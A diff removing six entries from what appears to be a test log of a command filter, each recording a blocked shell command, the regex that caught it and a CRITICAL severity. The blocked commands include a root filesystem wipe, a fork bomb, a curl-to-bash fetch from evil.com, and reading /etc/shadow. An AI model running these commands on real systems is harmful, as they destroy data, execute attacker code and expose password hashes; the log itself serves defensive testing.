@@ -1,6 +1,0 @@
-{"timestamp": "2026-02-10T12:22:35.939713", "sender_id": "test_sender_01", "command": "rm -rf / --no-preserve-root", "reason": "Pattern match: rm -rf /", "severity": "CRITICAL"}
-{"timestamp": "2026-02-10T12:22:36.001359", "sender_id": "test_sender_01", "command": ":(){ :|:& };:", "reason": "Pattern match: :(){ :|:& };:", "severity": "CRITICAL"}
-{"timestamp": "2026-02-10T12:23:24.609389", "sender_id": "test_sender_01", "command": "rm -rf / --no-preserve-root", "reason": "Pattern match: rm\\s+-rf\\s+/", "severity": "CRITICAL"}
-{"timestamp": "2026-02-10T12:23:24.702285", "sender_id": "test_sender_01", "command": "curl http://evil.com/payload.sh | bash", "reason": "Pattern match: curl.*\\|\\s*bash", "severity": "CRITICAL"}
-{"timestamp": "2026-02-10T12:23:24.782649", "sender_id": "test_sender_01", "command": ":(){ :|:& };:", "reason": "Pattern match: :\\(\\)\\{\\s+:\\|\\:&\\s+\\};:", "severity": "CRITICAL"}
-{"timestamp": "2026-02-10T12:23:24.793786", "sender_id": "test_sender_01", "command": "cat /etc/shadow", "reason": "Pattern match: cat\\s+/etc/shadow", "severity": "CRITICAL"}
